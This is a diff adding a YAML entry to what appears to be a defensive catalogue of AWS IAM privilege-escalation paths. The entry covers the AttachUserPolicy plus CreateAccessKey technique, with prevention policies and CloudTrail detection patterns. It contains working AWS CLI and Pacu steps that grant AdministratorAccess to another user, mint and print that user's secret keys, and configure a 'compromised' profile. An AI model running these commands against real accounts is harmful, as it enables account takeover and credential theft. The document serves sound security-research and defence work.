@@ -1,0 +1,279 @@
+id: "iam-015"
+name: "iam:AttachUserPolicy + iam:CreateAccessKey"
+category: "lateral-movement"
+services:
+  - iam
+
+permissions:
+  required:
+    - permission: "iam:AttachUserPolicy"
+      resourceConstraints: "Must have access to attach policies to the target user"
+    - permission: "iam:CreateAccessKey"
+      resourceConstraints: "Must have permission to create access keys for the target user"
+  additional:
+    - permission: "iam:ListUsers"
+      resourceConstraints: "Helpful for discovering available users to target"
+    - permission: "iam:GetUser"
+      resourceConstraints: "Useful for retrieving target user details and verifying existence"
+    - permission: "iam:ListAttachedUserPolicies"
+      resourceConstraints: "Helpful for viewing current user permissions before and after modification"
+    - permission: "iam:ListAccessKeys"
+      resourceConstraints: "Useful for checking the number of existing access keys (AWS limit is 2 per user)"
+    - permission: "iam:ListPolicies"
+      resourceConstraints: "Helpful for discovering AWS-managed policies available to attach"
+
+description: A principal with `iam:AttachUserPolicy` and `iam:CreateAccessKey` permissions on a target IAM user can achieve privilege escalation by attaching an administrative policy (such as the AWS-managed AdministratorAccess policy) to that user, creating new access keys for them, and then authenticating as that user with the newly created credentials. This is a lateral movement attack where the attacker modifies another principal's permissions and then assumes their identity. Even if the target user initially has minimal or no privileges, the combination of these two permissions creates a complete privilege escalation path to administrative access.
+
+prerequisites:
+  admin:
+    - "A target IAM user must exist that the starting principal has permission to attach policies to"
+    - "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)"
+    - "The starting principal must have iam:AttachUserPolicy permission scoped to the target user"
+    - "The starting principal must have iam:CreateAccessKey permission scoped to the target user"
+  lateral:
+    - "A target IAM user must exist that the starting principal has permission to attach policies to"
+    - "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)"
+    - "The starting principal must have iam:AttachUserPolicy permission scoped to the target user"
+    - "The starting principal must have iam:CreateAccessKey permission scoped to the target user"
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        # Set the target user name
+        TARGET_USER="target-user-name"
+      description: "Define the target user that will be modified and compromised"
+    - step: 2
+      command: |
+        # List existing access keys for the target user
+        aws iam list-access-keys --user-name $TARGET_USER
+      description: "Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete one first using iam:DeleteAccessKey permission."
+    - step: 3
+      command: |
+        # Attach AdministratorAccess policy to the target user
+        aws iam attach-user-policy \
+          --user-name $TARGET_USER \
+          --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
+      description: "Attach the AWS-managed AdministratorAccess policy to the target user"
+    - step: 4
+      command: |
+        # Wait for IAM policy changes to propagate (15 seconds)
+        sleep 15
+      description: "Wait for the policy attachment to propagate across AWS infrastructure"
+    - step: 5
+      command: |
+        # Verify the policy was attached
+        aws iam list-attached-user-policies \
+          --user-name $TARGET_USER \
+          --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
+          --output table
+      description: "Verify that AdministratorAccess is now attached to the target user"
+    - step: 6
+      command: |
+        # Create new access keys for the target user
+        CREDENTIALS=$(aws iam create-access-key \
+          --user-name $TARGET_USER \
+          --output json)
+
+        # Extract the credentials
+        NEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')
+        NEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')
+
+        echo "New Access Key ID: $NEW_ACCESS_KEY_ID"
+        echo "New Secret Access Key: $NEW_SECRET_ACCESS_KEY"
+      description: "Create new access keys for the target user and extract the credentials"
+    - step: 7
+      command: |
+        # Configure a new AWS CLI profile with the stolen credentials
+        aws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised-user
+        aws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised-user
+        aws configure set region us-east-1 --profile compromised-user
+      description: "Configure a new AWS CLI profile using the newly created access keys"
+    - step: 8
+      command: |
+        # Verify administrative access using the new credentials
+        aws iam list-users --max-items 5 --profile compromised-user
+      description: "Verify that you now have administrative access by listing IAM users with the compromised credentials"
+  pacu:
+    - step: 1
+      command: |
+        # Use Pacu to attach AdministratorAccess to the target user
+        run iam__attach_user_policy --user-name target-user-name --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      description: "Use Pacu to attach the AdministratorAccess policy to the target user"
+    - step: 2
+      command: |
+        # Use Pacu to create access keys for the target user
+        run iam__create_access_key --user-name target-user-name
+      description: "Use Pacu to create new access keys for the target user and save them for authentication"
+    - step: 3
+      command: |
+        # Switch to the newly created credentials
+        swap_keys
+      description: "Configure Pacu to use the newly created access keys for the target user"
+
+limitations: |
+  This attack requires that the starting principal has both permissions (iam:AttachUserPolicy AND iam:CreateAccessKey) scoped to the same target user. If these permissions are scoped to different users, the attack path is not viable.
+
+  Additionally, the target user must have fewer than 2 access keys due to AWS's hard limit. If the user already has 2 keys, the attacker would need an additional permission (iam:DeleteAccessKey) to remove an existing key before creating a new one.
+
+  The attack provides administrative access only if an admin policy (like AdministratorAccess) is attached to the user. However, the attacker could attach any AWS-managed or customer-managed policy they have visibility into, so the level of access depends on available policies.
+
+recommendation: |
+  Restrict `iam:AttachUserPolicy` and `iam:CreateAccessKey` using the principle of least privilege. These permissions should rarely be granted together on the same target user, as this combination creates a direct privilege escalation path.
+
+  **Prevention strategies:**
+
+  1. Use IAM policy conditions to restrict which policies can be attached:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:AttachUserPolicy",
+    "Resource": "arn:aws:iam::ACCOUNT:user/SpecificUser",
+    "Condition": {
+      "ArnNotEquals": {
+        "iam:PolicyARN": [
+          "arn:aws:iam::aws:policy/AdministratorAccess",
+          "arn:aws:iam::aws:policy/IAMFullAccess"
+        ]
+      }
+    }
+  }
+  ```
+
+  2. Restrict `iam:CreateAccessKey` to prevent cross-user access key creation:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:CreateAccessKey",
+    "Resource": "arn:aws:iam::ACCOUNT:user/${aws:username}",
+    "Condition": {
+      "StringEquals": {
+        "iam:UserName": "${aws:username}"
+      }
+    }
+  }
+  ```
+
+  3. Implement Service Control Policies (SCPs) to prevent attachment of highly privileged managed policies
+
+  4. Use IAM permissions boundaries to limit the maximum permissions a user can have, even if admin policies are attached
+
+  5. Separate the permissions - avoid granting both `iam:AttachUserPolicy` and `iam:CreateAccessKey` to the same principal for other users
+
+  6. Require MFA for sensitive policy attachment operations and access key creation
+
+  **Detection strategies:**
+
+  Monitor CloudTrail for the following event patterns:
+  - `AttachUserPolicy` API calls where the calling principal differs from the target user, especially when administrative policies are attached
+  - `CreateAccessKey` API calls where the calling principal differs from the target user
+  - Sequential occurrences of `AttachUserPolicy` followed by `CreateAccessKey` on the same user within a short time window
+  - Attachment of AWS-managed policies like `AdministratorAccess` or `IAMFullAccess` to users
+  - Access key creation events that follow policy modification events
+
+  Set up CloudWatch alarms for unexpected changes to user policies and creation of access keys by non-self principals. Investigate any modifications to user permissions combined with access key creation.
+
+discoveredBy:
+  name: "Spencer Gietzen"
+  organization: "Rhino Security Labs"
+  date: "2018"
+
+references:
+  - title: "AWS IAM Privilege Escalation – Methods and Mitigation"
+    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+  - title: "AWS IAM Privilege Escalation Methods (GitHub Repository)"
+    url: "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
+  - title: "AWS IAM Privilege Escalation Techniques - Hacking The Cloud"
+    url: "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+  - title: "Investigating Privilege Escalation Methods in AWS (Bishop Fox)"
+    url: "https://bishopfox.com/blog/privilege-escalation-in-aws"
+  - title: "IAM Vulnerable - AWS IAM Privilege Escalation Playground"
+    url: "https://github.com/BishopFox/iam-vulnerable"
+
+relatedPaths:
+  - "iam-001"
+  - "iam-002"
+  - "iam-003"
+  - "iam-014"
+
+detectionRules:
+  - platform: "CloudSIEM"
+    ruleId: "TBD"
+    url: "https://docs.datadoghq.com/security/default_rules/"
+
+toolSupport:
+  pmapper: true
+  iamVulnerable: true
+  pacu: true
+  prowler: true
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: starting-principal
+      type: principal
+      description: |
+        The principal initiating the attack. Can be an IAM user or role with both `iam:AttachUserPolicy` and `iam:CreateAccessKey` permissions on the target user.
+
+        This principal may have minimal or no administrative permissions initially, but the combination of these two permissions creates a complete privilege escalation path.
+
+    - id: target_user
+      label: target-user
+      type: resource
+      description: |
+        The IAM user being modified and compromised. Must be a valid IAM user with fewer than 2 existing access keys.
+
+        Initially, this user may have minimal or no privileges. The attacker will attach the AdministratorAccess policy to it and create new access keys for authentication.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        Full administrative access to the AWS account. The attacker achieves this by:
+        1. Attaching AdministratorAccess policy to the target user
+        2. Creating new access keys for the target user
+        3. Authenticating with those credentials to perform administrative actions
+
+        This is a deterministic outcome since the attacker controls which policy to attach to the user.
+
+  edges:
+    - from: start
+      to: target_user
+      label: iam:AttachUserPolicy (AdministratorAccess)
+      description: |
+        The attacker uses `iam:AttachUserPolicy` to attach the AWS-managed AdministratorAccess policy to the target user.
+
+        Command:
+        ```bash
+        aws iam attach-user-policy \
+          --user-name target-user-name \
+          --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
+        ```
+
+        After this action, the target user has administrative permissions. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.
+
+    - from: target_user
+      to: admin
+      label: iam:CreateAccessKey + Authenticate
+      description: |
+        The attacker uses `iam:CreateAccessKey` to create new access keys for the now-privileged target user, then authenticates using those credentials.
+
+        Commands:
+        ```bash
+        # Create access keys
+        CREDENTIALS=$(aws iam create-access-key \
+          --user-name target-user-name \
+          --output json)
+
+        NEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')
+        NEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')
+
+        # Configure profile with new credentials
+        aws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised
+        aws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised
+
+        # Use the compromised credentials
+        aws iam list-users --profile compromised
+        ```
+
+        These new access keys have full administrative permissions and can be used to perform any action in the AWS account. Unlike temporary credentials from AssumeRole, these access keys do not expire and remain valid until explicitly deactivated or deleted.
